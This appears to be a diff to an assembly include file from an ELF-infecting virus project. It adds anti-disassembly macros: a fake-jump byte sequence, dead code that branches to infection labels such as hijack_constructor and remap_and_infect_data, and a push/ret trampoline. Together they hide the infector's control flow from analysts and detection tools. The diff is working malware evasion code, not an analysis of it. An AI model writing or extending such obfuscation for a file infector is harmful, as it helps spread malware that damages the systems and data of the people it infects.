@@ -154,4 +154,45 @@ endstruc
 
 %define RELA_SIZE   0x30
 
+%define OBF_FAKE_JUMP db 0xeb, 0x01, 0xe9
+
+%macro OBF_USELESS_INSTR 1
+    jmp     %%end_bullshit
+    %if %0 = 1
+        mov     rax, [rsp + 0x8]
+        xor     rbx, rbx
+        add     rax, rbx
+        mov     rdi, rax
+        mov     rsi, rdx
+        mov     rax, rcx
+        syscall
+    %elif %0 = 2
+        mov     rax, rcx
+        cqo
+        div     rbx
+        mov     rcx, rdx
+        add     rax, rcx
+        or      rax, rdx
+    %else
+        mov     rax, rdx
+        test    rax, rax
+        jz      quit_infect
+        cmp     al, 12
+        jle     hijack_constructor
+        cmp     rax, rbx
+        ja      remap_and_infect_data
+    %endif
+    %%end_bullshit:
+%endmacro
+
+%macro PUSH_RET 0
+    push    rax
+    push    rax
+    lea     rax, [rel %%ret_to]
+    mov     QWORD [rsp + 0x8], rax
+    pop     rax
+    ret
+    %%ret_to:
+%endmacro
+
 %endif
